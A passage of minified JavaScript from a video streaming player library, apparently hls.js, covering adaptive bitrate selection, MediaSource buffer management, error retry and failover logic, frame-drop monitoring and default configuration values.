l=r?Math.min(r,a.maxStarvationDelay):a.maxStarvationDelay,u=a.abrBandWidthFactor,h=a.abrBandWidthUpFactor;return n||(t=this.bitrateTestDelay)&&(l=(r=r?Math.min(r,a.maxLoadingDelay):a.maxLoadingDelay)-t,V.trace(`[abr] bitrate test took ${Math.round(1e3*t)}ms, set first fragment max fetchDuration to ${Math.round(1e3*l)} ms`),u=h=1),e=this.findBestLevel(o,s,i,n+l,u,h),Math.max(e,0)}findBestLevel(r,t,n,i,a,s){var e,{fragCurrent:o,partCurrent:l,lastLoadedFragLevel:u}=this,h=this.hls.levels,c=h[u],d=!(null==c||null==(e=c.details)||!e.live),f=null==c?void 0:c.codecSet,p=l?l.duration:o?o.duration:0,g=this.bwEstimator.getEstimateTTFB()/1e3;let v=t,m=-1;for(let e=n;e>=t;e--){if(!(y=h[e])||f&&y.codecSet!==f)y&&(v=Math.min(e,v),m=Math.max(e,m));else{-1!==m&&V.trace(`[abr] Skipped level(s) ${v}-${m} with CODECS:"${h[m].attrs.CODECS}"; not compatible with "${c.attrs.CODECS}"`);var y=y.details,E=(l?null==y?void 0:y.partTarget:null==y?void 0:y.averagetargetduration)||p;let t;t=e<=u?a*r:s*r;var T=h[e].maxBitrate;y=this.getTimeToLoadFrag(g,t,T*E,void 0===y);if(V.trace(`[abr] level:${e} adjustedbw-bitrate:${Math.round(t-T)} avgDuration:${E.toFixed(1)} maxFetchDuration:${i.toFixed(1)} fetchDuration:`+y.toFixed(1)),t>T&&(0===y||!N(y)||d&&!this.bitrateTestDelay||y<i))return e}}return-1}set nextAutoLevel(t){this._nextAutoLevel=t}},bufferController:class{constructor(t){this.details=null,this._objectUrl=null,this.operationQueue=void 0,this.listeners=void 0,this.hls=void 0,this.bufferCodecEventsExpected=0,this._bufferCodecEventsTotal=0,this.media=null,this.mediaSource=null,this.lastMpegAudioChunk=null,this.appendError=0,this.tracks={},this.pendingTracks={},this.sourceBuffer=void 0,this._onMediaSourceOpen=()=>{var{media:t,mediaSource:e}=this;V.log("[buffer-controller]: Media source opened"),t&&(t.removeEventListener("emptied",this._onMediaEmptied),this.updateMediaElementDuration(),this.hls.trigger($.MEDIA_ATTACHED,{media:t})),e&&e.removeEventListener("sourceopen",this._onMediaSourceOpen),this.checkPendingTracks()},this._onMediaSourceClose=()=>{V.log("[buffer-controller]: Media source closed")},this._onMediaSourceEnded=()=>{V.log("[buffer-controller]: Media source ended")},this._onMediaEmptied=()=>{var{media:t,_objectUrl:e}=this;t&&t.src!==e&&V.error(`Media element src was set while attaching MediaSource (${e} > ${t.src})`)},this.hls=t,this._initSourceBuffer(),this.registerListeners()}hasSourceTypes(){return 0<this.getSourceBufferTypes().length||0<Object.keys(this.pendingTracks).length}destroy(){this.unregisterListeners(),this.details=null,this.lastMpegAudioChunk=null}registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.BUFFER_RESET,this.onBufferReset,this),t.on($.BUFFER_APPENDING,this.onBufferAppending,this),t.on($.BUFFER_CODECS,this.onBufferCodecs,this),t.on($.BUFFER_EOS,this.onBufferEos,this),t.on($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.on($.LEVEL_UPDATED,this.onLevelUpdated,this),t.on($.FRAG_PARSED,this.onFragParsed,this),t.on($.FRAG_CHANGED,this.onFragChanged,this)}unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.BUFFER_RESET,this.onBufferReset,this),t.off($.BUFFER_APPENDING,this.onBufferAppending,this),t.off($.BUFFER_CODECS,this.onBufferCodecs,this),t.off($.BUFFER_EOS,this.onBufferEos,this),t.off($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.off($.LEVEL_UPDATED,this.onLevelUpdated,this),t.off($.FRAG_PARSED,this.onFragParsed,this),t.off($.FRAG_CHANGED,this.onFragChanged,this)}_initSourceBuffer(){this.sourceBuffer={},this.operationQueue=new ti(this.sourceBuffer),this.listeners={audio:[],video:[],audiovideo:[]},this.lastMpegAudioChunk=null}onManifestLoading(){this.bufferCodecEventsExpected=this._bufferCodecEventsTotal=0,this.details=null}onManifestParsed(t,e){let r=2;(!e.audio||e.video)&&e.altAudio||(r=1),this.bufferCodecEventsExpected=this._bufferCodecEventsTotal=r,V.log(this.bufferCodecEventsExpected+" bufferCodec event(s) expected")}onMediaAttaching(t,e){var r;(e=this.media=e.media)&&ei&&((r=this.mediaSource=new ei).addEventListener("sourceopen",this._onMediaSourceOpen),r.addEventListener("sourceended",this._onMediaSourceEnded),r.addEventListener("sourceclose",this._onMediaSourceClose),e.src=self.URL.createObjectURL(r),this._objectUrl=e.src,e.addEventListener("emptied",this._onMediaEmptied))}onMediaDetaching(){var{media:t,mediaSource:e,_objectUrl:r}=this;if(e){if(V.log("[buffer-controller]: media source detaching"),"open"===e.readyState)try{e.endOfStream()}catch(t){V.warn(`[buffer-controller]: onMediaDetaching: ${t.message} while calling endOfStream`)}this.onBufferReset(),e.removeEventListener("sourceopen",this._onMediaSourceOpen),e.removeEventListener("sourceended",this._onMediaSourceEnded),e.removeEventListener("sourceclose",this._onMediaSourceClose),t&&(t.removeEventListener("emptied",this._onMediaEmptied),r&&self.URL.revokeObjectURL(r),t.src===r?(t.removeAttribute("src"),t.load()):V.warn("[buffer-controller]: media.src was changed by a third party - skip cleanup")),this.mediaSource=null,this.media=null,this._objectUrl=null,this.bufferCodecEventsExpected=this._bufferCodecEventsTotal,this.pendingTracks={},this.tracks={}}this.hls.trigger($.MEDIA_DETACHED,void 0)}onBufferReset(){this.getSourceBufferTypes().forEach((e=>{var t=this.sourceBuffer[e];try{t&&(this.removeBufferListeners(e),this.mediaSource&&this.mediaSource.removeSourceBuffer(t),this.sourceBuffer[e]=void 0)}catch(t){V.warn(`[buffer-controller]: Failed to reset the ${e} buffer`,t)}})),this._initSourceBuffer()}onBufferCodecs(t,u){const h=this.getSourceBufferTypes().length;Object.keys(u).forEach((t=>{var e,r,n,i,a,s,o,l;h?(e=this.tracks[t])&&"function"==typeof e.buffer.changeType&&(({id:r,codec:n,levelCodec:i,container:a,metadata:s}=u[t]),(o=(e.levelCodec||e.codec).replace(ri,"$1"))!==(l=(i||n).replace(ri,"$1")))&&(this.appendChangeType(t,a+";codecs="+(i||n)),V.log(`[buffer-controller]: switching codec ${o} to `+l),this.tracks[t]={buffer:e.buffer,codec:n,container:a,levelCodec:i,metadata:s,id:r}):this.pendingTracks[t]=u[t]})),h||(this.bufferCodecEventsExpected=Math.max(this.bufferCodecEventsExpected-1,0),this.mediaSource&&"open"===this.mediaSource.readyState&&this.checkPendingTracks())}appendChangeType(e,r){const n=this.operationQueue;n.append({execute:()=>{var t=this.sourceBuffer[e];t&&(V.log(`[buffer-controller]: changing ${e} sourceBuffer type to `+r),t.changeType(r)),n.shiftAndExecuteNext(e)},onStart:()=>{},onComplete:()=>{},onError:t=>{V.warn(`[buffer-controller]: Failed to change ${e} SourceBuffer type`,t)}},e)}onBufferAppending(t,e){const{hls:r,operationQueue:n,tracks:i}=this,{data:a,type:s,frag:o,part:l,chunkMeta:u}=e,h=u.buffering[s];e=self.performance.now(),h.start=e;const c=o.stats.buffering,d=l?l.stats.buffering:null;0===c.start&&(c.start=e),d&&0===d.start&&(d.start=e),e=i.audio;let f=!1;"audio"===s&&"audio/mpeg"===(null==e?void 0:e.container)&&(f=!this.lastMpegAudioChunk||1===u.id||this.lastMpegAudioChunk.sn!==u.sn,this.lastMpegAudioChunk=u);const p=o.start;n.append({execute:()=>{var t,e;h.executeStart=self.performance.now(),f&&(t=this.sourceBuffer[s])&&(e=p-t.timestampOffset,.1<=Math.abs(e))&&(V.log(`[buffer-controller]: Updating audio SourceBuffer timestampOffset to ${p} (delta: ${e}) sn: ${o.sn})`),t.timestampOffset=p),this.appendExecutor(a,s)},onStart:()=>{},onComplete:()=>{var t=self.performance.now(),e=(h.executeEnd=h.end=t,0===c.first&&(c.first=t),d&&0===d.first&&(d.first=t),this).sourceBuffer,r={};for(const s in e)r[s]=S.getBuffered(e[s]);this.appendError=0,this.hls.trigger($.BUFFER_APPENDED,{type:s,frag:o,part:l,chunkMeta:u,parent:o.type,timeRanges:r})},onError:t=>{V.error(`[buffer-controller]: Error encountered while trying to append to the ${s} SourceBuffer`,t);var e={type:K.MEDIA_ERROR,parent:o.type,details:H.BUFFER_APPEND_ERROR,frag:o,part:l,chunkMeta:u,error:t,err:t,fatal:!1};t.code===DOMException.QUOTA_EXCEEDED_ERR?e.details=H.BUFFER_FULL_ERROR:(this.appendError++,e.details=H.BUFFER_APPEND_ERROR,this.appendError>r.config.appendErrorMaxRetry&&(V.error(`[buffer-controller]: Failed ${r.config.appendErrorMaxRetry} times to append segment in sourceBuffer`),e.fatal=!0)),r.trigger($.ERROR,e)}},s)}onBufferFlushing(t,r){const e=this.operationQueue,n=e=>({execute:this.removeExecutor.bind(this,e,r.startOffset,r.endOffset),onStart:()=>{},onComplete:()=>{this.hls.trigger($.BUFFER_FLUSHED,{type:e})},onError:t=>{V.warn(`[buffer-controller]: Failed to remove from ${e} SourceBuffer`,t)}});r.type?e.append(n(r.type),r.type):this.getSourceBufferTypes().forEach((t=>{e.append(n(t),t)}))}onFragParsed(t,e){const{frag:r,part:n}=e;e=[];var i=(n||r).elementaryStreams;i[lt]?e.push("audiovideo"):(i[y]&&e.push("audio"),i[k]&&e.push("video")),0===e.length&&V.warn(`Fragments must have at least one ElementaryStreamType set. type: ${r.type} level: ${r.level} sn: `+r.sn),this.blockBuffers((()=>{var t=self.performance.now();r.stats.buffering.end=t,n&&(n.stats.buffering.end=t),t=(n||r).stats;this.hls.trigger($.FRAG_BUFFERED,{frag:r,part:n,stats:t,id:r.type})}),e)}onFragChanged(t,e){this.flushBackBuffer()}onBufferEos(t,n){this.getSourceBufferTypes().reduce(((t,e)=>{var r=this.sourceBuffer[e];return!r||n.type&&n.type!==e||(r.ending=!0,r.ended)||(r.ended=!0,V.log(`[buffer-controller]: ${e} sourceBuffer now EOS`)),t&&!(r&&!r.ended)}),!0)&&(V.log("[buffer-controller]: Queueing mediaSource.endOfStream()"),this.blockBuffers((()=>{this.getSourceBufferTypes().forEach((t=>{(t=this.sourceBuffer[t])&&(t.ending=!1)}));var t=this.mediaSource;t&&"open"===t.readyState?(V.log("[buffer-controller]: Calling mediaSource.endOfStream()"),t.endOfStream()):t&&V.info("[buffer-controller]: Could not call mediaSource.endOfStream(). mediaSource.readyState: "+t.readyState)})))}onLevelUpdated(t,{details:e}){e.fragments.length&&(this.details=e,this.getSourceBufferTypes().length?this.blockBuffers(this.updateMediaElementDuration.bind(this)):this.updateMediaElementDuration())}flushBackBuffer(){const{hls:n,details:i,media:t,sourceBuffer:a}=this;if(t&&null!==i){var e=this.getSourceBufferTypes();if(e.length){var r=i.live&&null!==n.config.liveBackBufferLength?n.config.liveBackBufferLength:n.config.backBufferLength;if(N(r)&&!(r<0)){const s=t.currentTime,o=i.levelTargetDuration;r=Math.max(r,o);const l=Math.floor(s/o)*o-r;e.forEach((t=>{var e=a[t];if(e){var r=S.getBuffered(e);if(0<r.length&&l>r.start(0)){if(n.trigger($.BACK_BUFFER_REACHED,{bufferEnd:l}),i.live)n.trigger($.LIVE_BACK_BUFFER_REACHED,{bufferEnd:l});else if(e.ended&&r.end(r.length-1)-s<2*o)return void V.info(`[buffer-controller]: Cannot flush ${t} back buffer while SourceBuffer is in ended state`);n.trigger($.BUFFER_FLUSHING,{startOffset:0,endOffset:l,type:t})}}}))}}}}updateMediaElementDuration(){var t,e,r,n,i,a;this.details&&this.media&&this.mediaSource&&"open"===this.mediaSource.readyState&&(({details:t,hls:e,media:i,mediaSource:r}=this),n=t.fragments[0].start+t.totalduration,i=i.duration,a=N(r.duration)?r.duration:0,t.live&&e.config.liveDurationInfinity?(V.log("[buffer-controller]: Media Source duration is set to Infinity"),r.duration=1/0,this.updateSeekableRange(t)):(a<n&&i<n||!N(i))&&(V.log("[buffer-controller]: Updating Media Source duration to "+n.toFixed(3)),r.duration=n))}updateSeekableRange(t){var e=this.mediaSource,r=t.fragments;r.length&&t.live&&null!=e&&e.setLiveSeekableRange&&(r=Math.max(0,r[0].start),t=Math.max(r,r+t.totalduration),e.setLiveSeekableRange(r,t))}checkPendingTracks(){const{bufferCodecEventsExpected:t,operationQueue:e,pendingTracks:r}=this;var n=Object.keys(r).length;(n&&!t||2===n)&&(this.createSourceBuffers(r),this.pendingTracks={},(n=this.getSourceBufferTypes()).length?(this.hls.trigger($.BUFFER_CREATED,{tracks:this.tracks}),n.forEach((t=>{e.executeNext(t)}))):(n=new Error("could not create source buffer for media codec(s)"),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_INCOMPATIBLE_CODECS_ERROR,fatal:!0,error:n,reason:n.message})))}createSourceBuffers(t){var{sourceBuffer:e,mediaSource:r}=this;if(!r)throw Error("createSourceBuffers called when mediaSource was null");for(const l in t)if(!e[l]){var n=t[l];if(!n)throw Error(`source buffer exists for track ${l}, however track does not`);var i=n.levelCodec||n.codec,a=n.container+";codecs="+i;V.log(`[buffer-controller]: creating sourceBuffer(${a})`);try{var s=e[l]=r.addSourceBuffer(a),o=l;this.addBufferListener(o,"updatestart",this._onSBUpdateStart),this.addBufferListener(o,"updateend",this._onSBUpdateEnd),this.addBufferListener(o,"error",this._onSBUpdateError),this.tracks[l]={buffer:s,codec:i,container:n.container,levelCodec:n.levelCodec,metadata:n.metadata,id:n.id}}catch(t){V.error("[buffer-controller]: error while trying to add sourceBuffer: "+t.message),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_ADD_CODEC_ERROR,fatal:!1,error:t,mimeType:a})}}}_onSBUpdateStart(t){this.operationQueue.current(t).onStart()}_onSBUpdateEnd(t){var e=this.operationQueue;e.current(t).onComplete(),e.shiftAndExecuteNext(t)}_onSBUpdateError(t,e){var r=new Error(t+" SourceBuffer error");(r=(V.error("[buffer-controller]: "+r,e),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.BUFFER_APPENDING_ERROR,error:r,fatal:!1}),this.operationQueue.current(t)))&&r.onError(e)}removeExecutor(t,e,r){var{media:n,mediaSource:i,operationQueue:a,sourceBuffer:s}=this,s=s[t];n&&i&&s?(n=N(n.duration)?n.duration:1/0,i=N(i.duration)?i.duration:1/0,(e=Math.max(0,e))<(r=Math.min(r,n,i))&&!s.ending?(s.ended=!1,V.log(`[buffer-controller]: Removing [${e},${r}] from the ${t} SourceBuffer`),s.remove(e,r)):a.shiftAndExecuteNext(t)):(V.warn(`[buffer-controller]: Attempting to remove from the ${t} SourceBuffer, but it does not exist`),a.shiftAndExecuteNext(t))}appendExecutor(t,e){var n,{operationQueue:r,sourceBuffer:n}=this;(n=n[e])?(n.ended=!1,n.appendBuffer(t)):(V.warn(`[buffer-controller]: Attempting to append to the ${e} SourceBuffer, but it does not exist`),r.shiftAndExecuteNext(e))}blockBuffers(t,e=this.getSourceBufferTypes()){if(e.length){const n=this.operationQueue;var r=e.map((t=>n.appendBlocker(t)));Promise.all(r).then((()=>{t(),e.forEach((t=>{var e=this.sourceBuffer[t];null!=e&&e.updating||n.shiftAndExecuteNext(t)}))}))}else V.log("[buffer-controller]: Blocking operation requested, but no SourceBuffers exist"),Promise.resolve().then(t)}getSourceBufferTypes(){return Object.keys(this.sourceBuffer)}addBufferListener(t,e,r){var n=this.sourceBuffer[t];n&&(r=r.bind(this,t),this.listeners[t].push({event:e,listener:r}),n.addEventListener(e,r))}removeBufferListeners(t){const e=this.sourceBuffer[t];e&&this.listeners[t].forEach((t=>{e.removeEventListener(t.event,t.listener)}))}},capLevelController:qi,errorController:class{constructor(t){this.hls=void 0,this.playlistError=0,this.penalizedRenditions={},this.log=void 0,this.warn=void 0,this.error=void 0,this.hls=t,this.log=V.log.bind(V,"[info]:"),this.warn=V.warn.bind(V,"[warning]:"),this.error=V.error.bind(V,"[error]:"),this.registerListeners()}registerListeners(){var t=this.hls;t.on($.ERROR,this.onError,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.LEVEL_UPDATED,this.onLevelUpdated,this)}unregisterListeners(){var t=this.hls;t&&(t.off($.ERROR,this.onError,this),t.off($.ERROR,this.onErrorOut,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.LEVEL_UPDATED,this.onLevelUpdated,this))}destroy(){this.unregisterListeners(),this.hls=null,this.penalizedRenditions={}}startLoad(t){this.playlistError=0}stopLoad(){}getVariantLevelIndex(t){return(null==t?void 0:t.type)===A?t.level:this.hls.loadLevel}onManifestLoading(){this.playlistError=0,this.penalizedRenditions={}}onLevelUpdated(){this.playlistError=0}onError(t,e){if(!e.fatal){var r,n=this.hls,i=e.context;switch(e.details){case H.FRAG_LOAD_ERROR:case H.FRAG_LOAD_TIMEOUT:case H.KEY_LOAD_ERROR:case H.KEY_LOAD_TIMEOUT:return void(e.errorAction=this.getFragRetryOrSwitchAction(e));case H.FRAG_PARSING_ERROR:if(null!=(a=e.frag)&&a.gap)return void(e.errorAction={action:0,flags:0});case H.FRAG_GAP:case H.FRAG_DECRYPT_ERROR:return e.errorAction=this.getFragRetryOrSwitchAction(e),void(e.errorAction.action=2);case H.LEVEL_EMPTY_ERROR:case H.LEVEL_PARSING_ERROR:var a=e.parent===A?e.level:n.loadLevel;return void(e.details===H.LEVEL_EMPTY_ERROR&&null!=(s=e.context)&&null!=(s=s.levelDetails)&&s.live?e.errorAction=this.getPlaylistRetryOrSwitchAction(e,a):(e.levelRetry=!1,e.errorAction=this.getLevelSwitchAction(e,a)));case H.LEVEL_LOAD_ERROR:case H.LEVEL_LOAD_TIMEOUT:return void("number"==typeof(null==i?void 0:i.level)&&(e.errorAction=this.getPlaylistRetryOrSwitchAction(e,i.level)));case H.AUDIO_TRACK_LOAD_ERROR:case H.AUDIO_TRACK_LOAD_TIMEOUT:case H.SUBTITLE_LOAD_ERROR:case H.SUBTITLE_TRACK_LOAD_TIMEOUT:if(i)if((s=n.levels[n.loadLevel])&&(i.type===E&&i.groupId===s.audioGroupId||i.type===b&&i.groupId===s.textGroupId))return e.errorAction=this.getPlaylistRetryOrSwitchAction(e,n.loadLevel),e.errorAction.action=2,void(e.errorAction.flags=1);return;case H.KEY_SYSTEM_STATUS_OUTPUT_RESTRICTED:var s;return void((s=null==(a=n.levels[n.loadLevel])?void 0:a.attrs["HDCP-LEVEL"])&&(e.errorAction={action:2,flags:2,hdcpLevel:s}));case H.BUFFER_ADD_CODEC_ERROR:case H.REMUX_ALLOC_ERROR:return void(e.errorAction=this.getLevelSwitchAction(e,null!=(a=e.level)?a:n.loadLevel));case H.INTERNAL_EXCEPTION:case H.BUFFER_APPENDING_ERROR:case H.BUFFER_APPEND_ERROR:case H.BUFFER_FULL_ERROR:case H.LEVEL_SWITCH_ERROR:case H.BUFFER_STALLED_ERROR:case H.BUFFER_SEEK_OVER_HOLE:case H.BUFFER_NUDGE_ON_STALL:return void(e.errorAction={action:0,flags:0})}e.type===K.KEY_SYSTEM_ERROR&&(r=this.getVariantLevelIndex(e.frag),e.levelRetry=!1,e.errorAction=this.getLevelSwitchAction(e,r))}}getPlaylistRetryOrSwitchAction(t,e){var r=Je(this.hls.config.playlistLoadPolicy,t),n=this.playlistError++,i=null==(i=t.response)?void 0:i.code;return er(r,n,Xe(t),i)?{action:5,flags:0,retryConfig:r,retryCount:n}:(i=this.getLevelSwitchAction(t,e),r&&(i.retryConfig=r,i.retryCount=n),i)}getFragRetryOrSwitchAction(t){var e=this.hls,r=this.getVariantLevelIndex(t.frag),n=e.levels[r],{fragLoadPolicy:i,keyLoadPolicy:a}=e.config,a=Je(t.details.startsWith("key")?a:i,t),i=e.levels.reduce(((t,e)=>t+e.fragmentError),0);return n&&(t.details!==H.FRAG_GAP&&n.fragmentError++,n=null==(e=t.response)?void 0:e.code,er(a,i,Xe(t),n))?{action:5,flags:0,retryConfig:a,retryCount:i}:(e=this.getLevelSwitchAction(t,r),a&&(e.retryConfig=a,e.retryCount=i),e)}getLevelSwitchAction(r,t){var n=this.hls,i=(null==t&&(t=n.loadLevel),this.hls.levels[t]);if(i&&(i.loadError++,n.autoLevelEnabled)){let e=-1;var{levels:a,loadLevel:s,minAutoLevel:o,maxAutoLevel:l}=n,u=null==(t=r.frag)?void 0:t.type,{type:h,groupId:c}=null!=(t=r.context)?t:{};for(let t=a.length;t--;){var d=(t+s)%a.length;if(d!==s&&o<=d&&d<=l&&0===a[d].loadError){var f=a[d];if(r.details===H.FRAG_GAP&&r.frag){var p=a[d].details;if(p&&null!=(p=ir(r.frag,p.fragments,r.frag.start))&&p.gap)continue}else{if(h===E&&c===f.audioGroupId||h===b&&c===f.textGroupId)continue;if(u===_&&i.audioGroupId===f.audioGroupId||u===be&&i.textGroupId===f.textGroupId)continue}e=d;break}}if(-1<e&&n.loadLevel!==e)return r.levelRetry=!0,this.playlistError=0,{action:2,flags:0,nextAutoLevel:e}}return{action:2,flags:1}}onErrorOut(t,e){var r;switch(null==(r=e.errorAction)?void 0:r.action){case 0:break;case 2:this.sendAlternateToPenaltyBox(e),e.errorAction.resolved||e.details===H.FRAG_GAP||(e.fatal=!0)}e.fatal&&this.hls.stopLoad()}sendAlternateToPenaltyBox(t){var e=this.hls,r=t.errorAction;if(r){var{flags:n,hdcpLevel:i,nextAutoLevel:a}=r;switch(n){case 0:this.switchLevel(t,a);break;case 1:r.resolved||(r.resolved=this.redundantFailover(t));break;case 2:i&&(e.maxHdcpLevel=Be[Be.indexOf(i)-1],r.resolved=!0),this.warn(`Restricting playback to HDCP-LEVEL of "${e.maxHdcpLevel}" or lower`)}r.resolved||this.switchLevel(t,a)}}switchLevel(t,e){void 0!==e&&t.errorAction&&(this.warn(`switching to level ${e} after `+t.details),this.hls.nextAutoLevel=e,t.errorAction.resolved=!0,this.hls.nextLoadLevel=this.hls.nextAutoLevel)}redundantFailover(e){var{hls:r,penalizedRenditions:n}=this,i=e.parent===A?e.level:r.loadLevel,a=r.levels[i],s=a.url.length,o=(e.frag||a).urlId;a.urlId!==o||e.frag&&!a.details||this.penalizeRendition(a,e);for(let t=1;t<s;t++){const u=(o+t)%s;var l=n[u];if(!l||function(t,e,r){if(3e5<performance.now()-t.lastErrorPerfMs)return 1;var n=t.details;if(e.details===H.FRAG_GAP&&n&&e.frag){var i=e.frag.start;if((i=ir(null,n.fragments,i))&&!i.gap)return 1}return r&&t.errors.length<r.errors.length&&(i=t.errors[t.errors.length-1],n&&i.frag&&e.frag&&Math.abs(i.frag.start-e.frag.start)>3*n.targetduration)?1:void 0}(l,e,n[o]))return this.warn(`Switching to Redundant Stream ${1+u}/${s}: "${a.url[u]}" after `+e.details),this.playlistError=0,r.levels.forEach((t=>{t.urlId=u})),r.nextLoadLevel=i,!0}return!1}penalizeRendition(t,e){var r=this.penalizedRenditions,n=r[t.urlId]||{lastErrorPerfMs:0,errors:[],details:void 0};n.lastErrorPerfMs=performance.now(),n.errors.push(e),n.details=t.details,r[t.urlId]=n}},fpsController:class{constructor(t){this.hls=void 0,this.isVideoPlaybackQualityAvailable=!1,this.timer=void 0,this.media=null,this.lastTime=void 0,this.lastDroppedFrames=0,this.lastDecodedFrames=0,this.streamController=void 0,this.hls=t,this.registerListeners()}setStreamController(t){this.streamController=t}registerListeners(){this.hls.on($.MEDIA_ATTACHING,this.onMediaAttaching,this)}unregisterListeners(){this.hls.off($.MEDIA_ATTACHING,this.onMediaAttaching,this)}destroy(){this.timer&&clearInterval(this.timer),this.unregisterListeners(),this.isVideoPlaybackQualityAvailable=!1,this.media=null}onMediaAttaching(t,e){var r=this.hls.config;r.capLevelOnFPSDrop&&(e=e.media instanceof self.HTMLVideoElement?e.media:null,(this.media=e)&&"function"==typeof e.getVideoPlaybackQuality&&(this.isVideoPlaybackQualityAvailable=!0),self.clearInterval(this.timer),this.timer=self.setInterval(this.checkFPSInterval.bind(this),r.fpsDroppedMonitoringPeriod))}checkFPS(t,e,r){var n,i,a,s,o=performance.now();e&&(this.lastTime&&(s=o-this.lastTime,n=r-this.lastDroppedFrames,i=e-this.lastDecodedFrames,s=1e3*n/s,(a=this.hls).trigger($.FPS_DROP,{currentDropped:n,currentDecoded:i,totalDroppedFrames:r}),0<s)&&n>a.config.fpsDroppedMonitoringThreshold*i&&(s=a.currentLevel,V.warn("drop FPS ratio greater than max allowed value for currentLevel: "+s),0<s)&&(-1===a.autoLevelCapping||a.autoLevelCapping>=s)&&(s-=1,a.trigger($.FPS_DROP_LEVEL_CAPPING,{level:s,droppedLevel:a.currentLevel}),a.autoLevelCapping=s,this.streamController.nextLevelSwitch()),this.lastTime=o,this.lastDroppedFrames=r,this.lastDecodedFrames=e)}checkFPSInterval(){var t,e=this.media;e&&(this.isVideoPlaybackQualityAvailable?(t=e.getVideoPlaybackQuality(),this.checkFPS(e,t.totalVideoFrames,t.droppedVideoFrames)):this.checkFPS(e,e.webkitDecodedFrameCount,e.webkitDroppedFrameCount))}},stretchShortVideoTrack:!1,maxAudioFramesDrift:1,forceKeyFrameOnDiscontinuity:!0,abrEwmaFastLive:3,abrEwmaSlowLive:9,abrEwmaFastVoD:3,abrEwmaSlowVoD:9,abrEwmaDefaultEstimate:5e5,abrBandWidthFactor:.95,abrBandWidthUpFactor:.7,abrMaxWithRealBitrate:!1,maxStarvationDelay:4,maxLoadingDelay:4,minAutoBitrate:0,emeEnabled:!1,widevineLicenseUrl:void 0,drmSystems:{},drmSystemOptions:{},requestMediaKeySystemAccessFunc:Lt,testBandwidth:!0,progressive:!1,lowLatencyMode:!0,cmcd:void 0,enableDateRangeMetadataCues:!0,enableEmsgMetadataCues:!0,enableID3MetadataCues:!0,certLoadPolicy:{default:{maxTimeToFirstByteMs:8e3,maxLoadTimeMs:2e4,timeoutRetry:null,errorRetry:null}},keyLoadPolicy:{default:{maxTimeToFirstByteMs:8e3,maxLoadTimeMs:2e4,timeoutRetry:{maxNumRetry:1,retryDelayMs:1e3,maxRetryDelayMs:2e4,backoff:"linear"},errorRetry:{maxNumRetry:8,retryDelayMs:1e3,maxRetryDelayMs:2e4,backoff:"linear"}}},manifestLoadPolicy:{default:{maxTimeToFirstByteMs:1/0,maxLoadTimeMs:2e4,timeoutRetry:{maxNumRetry:2,retryDelayMs:0,maxRetryDelayMs:0},errorRetry:{maxNumRetry:1,retryDelayMs:1e3,maxRetryDelayMs:8e3}}},playlistLoadPolicy:{default:{maxTimeToFirstByteMs:1e4,maxLoadTimeMs:2e4,timeoutRetry:{maxNumRetry:2,retryDelayMs:0,maxRetryDelayMs:0},errorRetry:{maxNumRetry:2,retryDelayMs:1e3,maxRetryDelayMs:8e3}}},fragLoadPolicy:{default:{maxTimeToFirstByteMs:1e4,maxLoadTimeMs:12e4,timeoutRetry:{maxNumRetry:4,retryDelayMs:0,maxRetryDelayMs:0},errorRetry:{maxNumRetry:6,retryDelayMs:1e3,maxRetryDelayMs:8e3}}},steeringManifestLoadPolicy:{default:{maxTimeToFirstByteMs:1e4,maxLoadTimeMs:2e4,timeoutRetry:{maxNumRetry:2,retryDelayMs:0,maxRetryDelayMs:0},errorRetry:{maxNumRetry:1,retryDelayMs:1e3,maxRetryDelayMs:8e3}}},manifestLoadingTimeOut:1e4,manifestLoadingMaxRetry:1,manifestLoadingRetryDelay:1e3,manifestLoadingMaxRetryTimeout:64e3,levelLoadingTimeOut:1e4,levelLoadingMaxRetry:4,levelLoadingRetryDelay:1e3,levelLoadingMaxRetryTimeout:64e3,fragLoadingTimeOut:2e4,fragLoadingMaxRetry:6,fragLoadingRetryDelay:1e3,fragLoadingMaxRetryTimeout:64e3},{cueHandler:fa,enableWebVTT:!0,enableIMSC1:!0,enableCEA708Captions:!0,captionsTextTrack1Label:"English",captionsTextTrack1LanguageCode:"en",captionsTextTrack2Label:"Spanish",captionsTextTrack2LanguageCode:"es",captionsTextTrack3Label:"Unknown CC",captionsTextTrack3LanguageCode:"",captionsTextTrack4Label:"Unknown CC",captionsTextTrack4LanguageCode:"",renderTextTracksNatively:!0}),{},{subtitleStreamController:class extends Kr{constructor(t,e,r){super(t,e,r,"[subtitle-stream-controller]",be),this.levels=[],this.currentTrackId=-1,this.tracksBuffered=[],this.mainDetails=null,this._registerListeners()}onHandlerDestroying(){this._unregisterListeners(),this.mainDetails=null}_registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.LEVEL_LOADED,this.onLevelLoaded,this),t.on($.ERROR,this.onError,this),t.on($.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),t.on($.SUBTITLE_TRACK_SWITCH,this.onSubtitleTrackSwitch,this),t.on($.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),t.on($.SUBTITLE_FRAG_PROCESSED,this.onSubtitleFragProcessed,this),t.on($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.on($.FRAG_BUFFERED,this.onFragBuffered,this)}_unregisterListeners(){var 